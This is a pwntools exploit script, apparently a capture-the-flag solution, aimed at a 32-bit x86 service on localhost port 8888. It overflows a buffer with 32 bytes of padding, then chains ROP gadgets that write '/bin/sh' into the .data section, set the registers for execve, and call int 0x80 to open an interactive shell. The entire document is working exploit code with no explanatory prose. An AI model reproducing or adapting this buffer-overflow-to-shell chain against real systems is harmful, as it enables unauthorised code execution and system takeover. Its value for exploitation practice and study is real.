from pwn import *

host = "127.0.0.1"
port = 8888
r  = remote(host, port)

context.arch = "i386" # x86
# context.log_level = "debug" # for debug mode

## bof
payload = 'a'*32 

## write to memory
buf = 0x80ea060 # .data
mov_edx_eax = 0x0809a15d
pop_edx = 0x0806e82a
pop_eax = 0x080bae06
rop = flat([pop_edx, buf, pop_eax, "/bin", mov_edx_eax])
rop += flat([pop_edx, buf+4, pop_eax, "/sh\x00", mov_edx_eax])
# print len(rop) # 40

## write to register
pop_edx_exc_ebx = 0x0806e850
rop += flat([pop_edx_exc_ebx, 0, 0, buf])
rop += flat([pop_eax, 0xb])

## system call
int_0x80 = 0x080493e1
rop += flat([int_0x80])
# print len(rop) #68

payload += rop
r.recvuntil(":")
r.sendline(payload)
r.interactive()